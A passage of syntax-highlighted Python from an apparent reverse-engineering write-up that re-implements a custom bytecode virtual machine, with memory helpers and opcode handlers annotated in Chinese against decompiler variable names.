</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>u64</span><span class=p>(</span><span class=n>x</span><span class=p>):</span> <span class=k>return</span> <span class=n>x</span> <span class=o>&amp;</span> <span class=mh>0xFFFFFFFFFFFFFFFF</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>VM</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>vmcode</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>,</span> <span class=n>input_ints</span><span class=o>=</span><span class=kc>None</span><span class=p>,</span> <span class=n>debug_after_n</span><span class=o>=</span><span class=kc>None</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>mem</span> <span class=o>=</span> <span class=nb>bytearray</span><span class=p>(</span><span class=n>MEM_SIZE</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>vmcode</span><span class=p>)</span> <span class=o>&gt;</span> <span class=n>DATA_BASE</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>raise</span> <span class=ne>ValueError</span><span class=p>(</span><span class=s2>&#34;vmcode too large&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>mem</span><span class=p>[:</span><span class=nb>len</span><span class=p>(</span><span class=n>vmcode</span><span class=p>)]</span> <span class=o>=</span> <span class=n>vmcode</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># VM 状态</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>regs</span> <span class=o>=</span> <span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>*</span> <span class=mi>8</span>          <span class=c1># s[0..7]</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>ip</span> <span class=o>=</span> <span class=mi>0</span>                  <span class=c1># 低 16 位：指令指针</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>dp</span> <span class=o>=</span> <span class=mh>0xFFFF</span>             <span class=c1># 高 16 位：数据/栈指针</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>base0</span> <span class=o>=</span> <span class=mi>0</span>               <span class=c1># LOWORD(v92)</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>base1</span> <span class=o>=</span> <span class=mi>0</span>               <span class=c1># WORD1(v92)</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>base2</span> <span class=o>=</span> <span class=mi>0</span>               <span class=c1># WORD2(v92)</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>zf</span> <span class=o>=</span> <span class=kc>False</span>              <span class=c1># BYTE6(v92) —— 零标志</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>run_flag</span> <span class=o>=</span> <span class=kc>True</span>         <span class=c1># HIBYTE(v92) —— 是否继续跑</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>output</span> <span class=o>=</span> <span class=kc>None</span>           <span class=c1># 0x84 时记一下输出值</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>debug_ok</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>num</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>debug_after_n</span> <span class=o>=</span> <span class=n>debug_after_n</span>
</span></span><span class=line><span class=cl>        <span class=c1># 输入整数写到内存后段</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>input_ints</span> <span class=ow>is</span> <span class=ow>not</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>idx</span><span class=p>,</span> <span class=n>val</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>(</span><span class=n>input_ints</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>idx</span> <span class=o>&gt;=</span> <span class=mi>50</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=k>break</span>
</span></span><span class=line><span class=cl>                <span class=n>off</span> <span class=o>=</span> <span class=n>DATA_BASE</span> <span class=o>+</span> <span class=n>idx</span> <span class=o>*</span> <span class=mi>8</span>
</span></span><span class=line><span class=cl>                <span class=n>struct</span><span class=o>.</span><span class=n>pack_into</span><span class=p>(</span><span class=s2>&#34;&lt;Q&#34;</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>mem</span><span class=p>,</span> <span class=n>off</span><span class=p>,</span> <span class=n>u64</span><span class=p>(</span><span class=n>val</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>log_file</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;vm.log&#34;</span><span class=p>,</span> <span class=s2>&#34;w&#34;</span><span class=p>,</span> <span class=n>encoding</span><span class=o>=</span><span class=s2>&#34;utf-8&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 内存读写辅助</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>read_u8</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>addr</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>addr</span> <span class=o>&amp;=</span> <span class=mh>0xFFFF</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=bp>self</span><span class=o>.</span><span class=n>mem</span><span class=p>[</span><span class=n>addr</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>read_u16</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>addr</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>addr</span> <span class=o>&amp;=</span> <span class=mh>0xFFFF</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>addr</span> <span class=o>==</span> <span class=mh>0xFFFF</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=bp>self</span><span class=o>.</span><span class=n>mem</span><span class=p>[</span><span class=n>addr</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=bp>self</span><span class=o>.</span><span class=n>mem</span><span class=p>[</span><span class=n>addr</span><span class=p>]</span> <span class=o>|</span> <span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>mem</span><span class=p>[(</span><span class=n>addr</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xFFFF</span><span class=p>]</span> <span class=o>&lt;&lt;</span> <span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>write_u8</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>addr</span><span class=p>,</span> <span class=n>val</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>addr</span> <span class=o>&amp;=</span> <span class=mh>0xFFFF</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>mem</span><span class=p>[</span><span class=n>addr</span><span class=p>]</span> <span class=o>=</span> <span class=n>u8</span><span class=p>(</span><span class=n>val</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>read_u64</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>addr</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>addr</span> <span class=o>&amp;=</span> <span class=mh>0xFFFF</span>
</span></span><span class=line><span class=cl>        <span class=n>bs</span> <span class=o>=</span> <span class=nb>bytes</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>mem</span><span class=p>[</span><span class=n>addr</span><span class=p>:</span><span class=n>addr</span><span class=o>+</span><span class=mi>8</span><span class=p>]</span> <span class=o>+</span> <span class=bp>self</span><span class=o>.</span><span class=n>mem</span><span class=p>[:</span><span class=nb>max</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>addr</span><span class=o>+</span><span class=mi>8</span><span class=o>-</span><span class=n>MEM_SIZE</span><span class=p>)])</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack_from</span><span class=p>(</span><span class=s2>&#34;&lt;Q&#34;</span><span class=p>,</span> <span class=n>bs</span><span class=p>,</span> <span class=mi>0</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>write_u64</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>addr</span><span class=p>,</span> <span class=n>val</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>addr</span> <span class=o>&amp;=</span> <span class=mh>0xFFFF</span>
</span></span><span class=line><span class=cl>        <span class=n>b</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s2>&#34;&lt;Q&#34;</span><span class=p>,</span> <span class=n>u64</span><span class=p>(</span><span class=n>val</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>8</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>mem</span><span class=p>[(</span><span class=n>addr</span> <span class=o>+</span> <span class=n>i</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xFFFF</span><span class=p>]</span> <span class=o>=</span> <span class=n>b</span><span class=p>[</span><span class=n>i</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>fetch_u8</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>b</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>read_u8</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>ip</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>ip</span> <span class=o>=</span> <span class=n>u16</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>ip</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>b</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>fetch_u16</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>lo</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>read_u8</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>ip</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>hi</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>read_u8</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>ip</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>ip</span> <span class=o>=</span> <span class=n>u16</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>ip</span> <span class=o>+</span> <span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=p>(</span><span class=n>hi</span> <span class=o>&lt;&lt;</span> <span class=mi>8</span><span class=p>)</span> <span class=o>|</span> <span class=n>lo</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>step</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>debug</span><span class=o>=</span><span class=kc>False</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>ip0</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>ip</span>
</span></span><span class=line><span class=cl>        <span class=n>opcode</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>def</span> <span class=nf>log</span><span class=p>(</span><span class=n>msg</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>cond</span> <span class=o>=</span> <span class=p>(</span><span class=n>debug</span> <span class=ow>or</span> <span class=bp>self</span><span class=o>.</span><span class=n>debug_ok</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=bp>self</span><span class=o>.</span><span class=n>debug_after_n</span> <span class=ow>is</span> <span class=ow>not</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>cond</span> <span class=o>=</span> <span class=n>cond</span> <span class=ow>and</span> <span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>num</span> <span class=o>==</span> <span class=bp>self</span><span class=o>.</span><span class=n>debug_after_n</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>cond</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>line</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;[IP=</span><span class=si>{</span><span class=n>ip0</span><span class=si>:</span><span class=s2>04x</span><span class=si>}</span><span class=s2> OP=</span><span class=si>{</span><span class=n>opcode</span><span class=si>:</span><span class=s2>02x</span><span class=si>}</span><span class=s2>] </span><span class=si>{</span><span class=n>msg</span><span class=si>}</span><span class=se>\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=nb>hasattr</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=s2>&#34;log_file&#34;</span><span class=p>)</span> <span class=ow>and</span> <span class=bp>self</span><span class=o>.</span><span class=n>log_file</span> <span class=ow>is</span> <span class=ow>not</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=bp>self</span><span class=o>.</span><span class=n>log_file</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>line</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=bp>self</span><span class=o>.</span><span class=n>log_file</span><span class=o>.</span><span class=n>flush</span><span class=p>()</span>
</span></span><span class=line><span class=cl>                <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=nb>print</span><span class=p>(</span><span class=n>line</span><span class=p>,</span> <span class=n>end</span><span class=o>=</span><span class=s2>&#34;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x00: NOP</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x00</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>log</span><span class=p>(</span><span class=s2>&#34;NOP&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x01: JMP imm16</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x01</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>imm</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u16</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=c1># log(f&#34;JMP 0x{imm:04x}&#34;)</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>ip</span> <span class=o>=</span> <span class=n>imm</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x02: JNZ imm16  （推测：ZF==0 时跳转）</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x02</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>imm</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u16</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=c1># log(f&#34;JNZ 0x{imm:04x}, ZF={self.zf}&#34;)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=ow>not</span> <span class=bp>self</span><span class=o>.</span><span class=n>zf</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=bp>self</span><span class=o>.</span><span class=n>ip</span> <span class=o>=</span> <span class=n>imm</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x03: JZ imm16   （推测：ZF==1 时跳转）</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x03</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>imm</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u16</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=c1># log(f&#34;JZ 0x{imm:04x}, ZF={self.zf}&#34;)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=bp>self</span><span class=o>.</span><span class=n>zf</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=bp>self</span><span class=o>.</span><span class=n>ip</span> <span class=o>=</span> <span class=n>imm</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x11: 设置 base0（LOWORD(v92)）</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x11</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>imm</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u16</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=c1># log(f&#34;SET base0 = 0x{imm:04x}&#34;)</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>base0</span> <span class=o>=</span> <span class=n>imm</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x12: 设置 base1（WORD1(v92)）</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x12</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>imm</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u16</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=c1># log(f&#34;SET base1 = 0x{imm:04x}&#34;)</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>base1</span> <span class=o>=</span> <span class=n>imm</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x15: R[reg] = QWORD[mem[base0]]</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x15</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>reg</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>reg</span> <span class=o>&gt;=</span> <span class=mi>8</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=c1># raise IndexError(&#34;reg out of range in 0x15&#34;)</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>            <span class=n>val</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>read_u64</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>base0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=c1># log(f&#34;LDQ R{reg} = [0x{self.base0:04x}] =&gt; 0x{val:016x}&#34;)</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>reg</span><span class=p>]</span> <span class=o>=</span> <span class=n>val</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x16: R[reg] = imm64</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x16</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>reg</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>reg</span> <span class=o>&gt;=</span> <span class=mi>8</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>                <span class=c1># raise IndexError(&#34;reg out of range in 0x16&#34;)</span>
</span></span><span class=line><span class=cl>            <span class=n>b</span> <span class=o>=</span> <span class=nb>bytes</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>mem</span><span class=p>[</span><span class=bp>self</span><span class=o>.</span><span class=n>ip</span><span class=p>:</span><span class=bp>self</span><span class=o>.</span><span class=n>ip</span><span class=o>+</span><span class=mi>8</span><span class=p>]</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>                      <span class=bp>self</span><span class=o>.</span><span class=n>mem</span><span class=p>[:</span><span class=nb>max</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>ip</span><span class=o>+</span><span class=mi>8</span><span class=o>-</span><span class=n>MEM_SIZE</span><span class=p>)])</span>
</span></span><span class=line><span class=cl>            <span class=n>imm</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack_from</span><span class=p>(</span><span class=s2>&#34;&lt;Q&#34;</span><span class=p>,</span> <span class=n>b</span><span class=p>,</span> <span class=mi>0</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>ip</span> <span class=o>=</span> <span class=n>u16</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>ip</span> <span class=o>+</span> <span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>reg</span><span class=p>]</span> <span class=o>=</span> <span class=n>imm</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>zf</span> <span class=o>=</span> <span class=p>(</span><span class=n>imm</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>log</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;LDI R</span><span class=si>{</span><span class=n>reg</span><span class=si>}</span><span class=s2> = 0x</span><span class=si>{</span><span class=n>imm</span><span class=si>:</span><span class=s2>016x</span><span class=si>}</span><span class=s2>, ZF=</span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>zf</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x17: R[dst] = R[src]</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x17</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>dst</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=n>src</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>dst</span> <span class=o>&gt;=</span> <span class=mi>8</span> <span class=ow>or</span> <span class=n>src</span> <span class=o>&gt;=</span> <span class=mi>8</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>                <span class=c1># raise IndexError(&#34;reg out of range in 0x17&#34;)</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>dst</span><span class=p>]</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>src</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>zf</span> <span class=o>=</span> <span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>dst</span><span class=p>]</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=c1># log(f&#34;MOV R{dst} = R{src} (0x{self.regs[dst]:016x}), ZF={self.zf}&#34;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x18: R[reg] = QWORD[mem[base0 + offset16]]</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x18</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>reg</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=n>off</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u16</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>reg</span> <span class=o>&gt;=</span> <span class=mi>8</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>                <span class=c1># raise IndexError(&#34;reg out of range in 0x18&#34;)</span>
</span></span><span class=line><span class=cl>            <span class=n>addr</span> <span class=o>=</span> <span class=n>u16</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>base0</span> <span class=o>+</span> <span class=n>off</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>val</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>read_u64</span><span class=p>(</span><span class=n>addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>reg</span><span class=p>]</span> <span class=o>=</span> <span class=n>val</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>reg</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=bp>self</span><span class=o>.</span><span class=n>debug_ok</span> <span class=o>=</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>            <span class=n>log</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;LDQ R</span><span class=si>{</span><span class=n>reg</span><span class=si>}</span><span class=s2> = [base0 + 0x</span><span class=si>{</span><span class=n>off</span><span class=si>:</span><span class=s2>04x</span><span class=si>}</span><span class=s2>] @0x</span><span class=si>{</span><span class=n>addr</span><span class=si>:</span><span class=s2>04x</span><span class=si>}</span><span class=s2> =&gt; 0x</span><span class=si>{</span><span class=n>val</span><span class=si>:</span><span class=s2>016x</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x19: QWORD[mem[base0]] = R[reg]</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x19</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>reg</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>reg</span> <span class=o>&gt;=</span> <span class=mi>8</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>                <span class=c1># raise IndexError(&#34;reg out of range in 0x19&#34;)</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>write_u64</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>base0</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>reg</span><span class=p>])</span>
</span></span><span class=line><span class=cl>            <span class=c1># log(f&#34;STQ [0x{self.base0:04x}] = R{reg} (0x{self.regs[reg]:016x})&#34;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x1A: R[dst] = byte[mem[base0 + (u16)R[src]]]</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x1A</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>dst</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
